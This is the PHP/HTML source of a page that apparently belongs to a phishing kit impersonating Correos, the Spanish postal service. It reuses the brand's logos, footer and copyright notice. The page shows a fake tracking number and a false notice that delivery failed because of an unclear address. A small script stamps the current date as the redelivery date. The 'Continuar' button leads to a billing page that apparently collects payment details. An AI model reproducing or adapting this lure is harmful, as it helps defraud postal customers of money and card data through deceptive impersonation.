<?php 

    require_once "functions.php";
                                    

?>
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Localizar envíos, oficinas y códigos postales| Correos.es</title>
        <!-- logo img title-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/atlas.css">
        <link rel="stylesheet"  href="css/animate.css">
</head>
<body >

        <div class="navbar">
            <div class="container">
                <div class="left d-flex align-items-center">
                    <img src="image/logo.svg" class="logo">
                    <ul class="nav align-items-center">
                        <li class="nav-item d-flex align-items-center"><img src="image/list.png"></li>
                    </ul>
                </div>
                <div class="right">
                    <div class="line"></div>
                    <img src="image/pp.png" width="150px">
                </div>  
            </div>
        </div>

        <main id="main" style="padding-top: 150px;">
            <div class="yellow">

            </div>
            <div class="text-center">
                <img src="image/sigue_tu_envio.svg" width="200px">
            </div>
            <div class="container">
                <div class="track">
                    <div class="old">
                        <img src="image/box.png" width="40px">
                        <p>
                            <b>Sigue tu envío</b>
                            <br>
                            <small></small>
                        </p>
                    </div>
                    <div class="old justify-content-between mt-3 align-items-center">
                        <p>
                            <b>N° de seguimiento de envío</b>
                            <br>
                            <small>PH9VMC0759767210146026M</small>
                        </p>
                        <img src="image/file.png" width="25px">
                    </div>
                </div>
                <div class="login shadow">
                    <div class="steps">
                        <ul class="nav">
                            <li class="nav-item">
                                <img src="image/box_1.png" width="35px">
                            </li>
                            <li class="nav-item">
                                <img src="image/box_2.png" width="50px">
                            </li>
                            <li class="nav-item">
                                <img src="image/box_3.png" width="50px">
                            </li>
                            <li class="nav-item">
                                <img src="image/box_4.png" width="45px">
                            </li>
                        </ul>
                        <ul class="nav mt-1">
                            <li class="nav-item">
                                <p><b>Preadmisión</b></p>
                            </li>
                            <li class="nav-item">
                                <p><b>En camino</b></p>
                            </li>
                            <li class="nav-item">
                                <p><b>En entrega</b></p>
                            </li>
                            <li class="nav-item">
                                <p style="color:#A5A5A5"><b>Entragado</b></p>
                            </li>
                        </ul>
                    </div>
                    <ul class="nav nada" style="background: #CFE2FF; border:1px solid #9EC5FE; color:#052C65;"> 
    <b style="color:#58151c"><i class="bi bi-info-circle"></i> Aviso de falla de entrega</b>
    <li class="nav-item mt-2">• Debido a que la dirección de entrega no está clara, su paquete no se entrega</li>
    <li class="nav-item mt-2">• Su paquete ha regresado a nuestro centro de operaciones</li>
    <li class="nav-item mt-2">• Actualice su dirección, enviaremos nuevamente en <span id="current-date"></span></li>
</ul>
<script>
    const date = new Date();
    const options = { year: 'numeric', month: 'long', day: 'numeric' };
    document.getElementById('current-date').textContent = date.toLocaleDateString('es-ES', options);
</script>
                    <a href="billing.php"><button class="btn" style="width:100%;">Continuar</button></a>
                </div>
            </div>
        </main>

        <!-- STAAAART____FOTTER -->
        <div class="fotter">
            <div class="container">
                <div class="row xx">
                    <div class="col-lg-3">
                        <ul class="nav d-block">
                            <li class="nav-item active">Para ti <img src="image/arrow.png"></li>
                            <li class="nav-item dd">Seguimiento de envío</li>
                            <li class="nav-item dd">Recibir</li>
                            <li class="nav-item dd">Enviar</li>
                        </ul>
                    </div>
                    <div class="col-lg-3">
                        <ul class="nav d-block">
                            <li class="nav-item active">Para tu empresa <img src="image/arrow.png"></li>
                            <li class="nav-item dd">Enviar</li>
                            <li class="nav-item dd">Ecommerce</li>
                            <li class="nav-item dd">Marketing</li>
                        </ul>
                    </div>
                    <div class="col-lg-3">
                        <ul class="nav d-block">
                            <li class="nav-item active">Para tu interés <img src="image/arrow.png"></li>
                            <li class="nav-item dd">Filatelia</li>
                            <li class="nav-item dd">Correos Market</li>
                            <li class="nav-item dd">Web institucional</li>
                        </ul>
                    </div>
                    <div class="col-lg-3">
                        <ul class="nav d-block">
                            <li class="nav-item active dd"><img src="image/cask.png" class="cask"><img src="image/arrow.png"></li>
                            <li class="nav-item dd">Atención al cliente</li>
                            <li class="nav-item ss"><img src="image/sosio.png" class="img-fluid"></li>
                        </ul>
                    </div>
                </div>
                <hr>
                <div class="row mt-3 mb-5">
                    <div class="col-lg-5 mt-3">
                        <p class="lead" style="font-size: 14px;">Descarga la App de Correos</p>
                        <div class="imgs  d-flex py-1 align-items-center">
                            <img src="image/apple.jpg" width="122px" height="40px" class="mt-2">
                            <img src="image/play.jpg" width="122px" height="40px" class="mt-2">
                            <img src="image/huawei.svg" width="122px" height="40px" class="mt-2">
                        </div>
                    </div>
                    <div class="col-lg-5 mt-3">
                        <p class="lead" style="font-size: 14px;">Descarga la App de Correos</p>
                        <div class="acht">
                            <ul class="nav">
                                <li class="nav-item d-flex align-items-center justify-content-center mt-2"><img src="image/mastercard.png" width="38" height="30"></li>
                                <li class="nav-item d-flex align-items-center justify-content-center mt-2"><img src="image/paypal.svg" width="38" height="9"></li>
                                <li class="nav-item d-flex align-items-center justify-content-center mt-2"><img src="image/maestro.svg" width="38" height="24"></li>
                                <li class="nav-item d-flex align-items-center justify-content-center mt-2"><img src="image/visa.svg" width="38" height="12"></li>
                                <li class="nav-item d-flex align-items-center justify-content-center mt-2"><img src="image/amex.svg" width="38" height="11"></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-7"></div>
                </div>
            </div>
        </div>
        <!-- ENNNNNND____FOTTER -->

        <!-- DIV_FOOOOOOT -->
        <div class="fot">
            <div class="container">
                <img src="image/logo_footer.svg">
                <div class="asd">
                    <ul class="nav">
                        <li class="nav-item">Política de cookies</li>
                        <li class="nav-item">Aviso legal</li>
                        <li class="nav-item">Privacidad web</li>
                        <li class="nav-item">Alerta seguridad</li>
                        <li class="nav-item">Accesibilidad</li>
                        <li class="nav-item">Configurador de cookies</li>
                    </ul>
                    <p>©Sociedad Estatal Correos y Telegrafos, S.A., S.M.E. Todos los derechos reservados.</p>
                </div>
            </div>
        </div>
        <!-- DIV_FOOOOOOT -->



        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>

                  
              
        </script>
              
</body>
</html>

